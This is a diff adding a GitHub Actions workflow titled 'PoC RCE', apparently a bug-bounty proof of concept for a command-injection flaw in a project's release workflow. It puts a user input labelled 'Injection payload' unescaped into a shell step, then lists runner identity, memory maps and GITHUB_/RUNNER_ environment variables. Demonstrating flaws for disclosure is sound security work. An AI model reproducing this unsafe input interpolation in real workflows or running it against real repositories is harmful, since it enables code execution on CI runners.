@@ -1,0 +1,33 @@
+name: "PoC RCE - poc-rce-1773465880"
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: "Injection payload"
+        required: true
+jobs:
+  rce-proof:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v6
+
+      - name: "STEP 1 — Command Injection (identical to release.yml)"
+        run: |
+          echo "=== COMMAND INJECTION PROOF ==="
+          echo "Simulating: mvnw versions:set -DnewVersion=${{ github.event.inputs.version }}"
+          echo "=== END ==="
+
+      - name: "STEP 2 — Machine Permissions (per Playtika PoC guidelines)"
+        run: |
+          echo "=== MACHINE PERMISSIONS ==="
+          echo "Execute:"
+          id
+          hostname
+          echo "Read:"
+          cat /proc/self/maps | head -5
+          echo "Write:"
+          touch /tmp/tatsuya3817178
+          ls -la /tmp/tatsuya3817178
+          echo "=== ENVIRONMENT ==="
+          env | grep -E "GITHUB_|RUNNER_" | sort | head -20
+          echo "=== END ==="
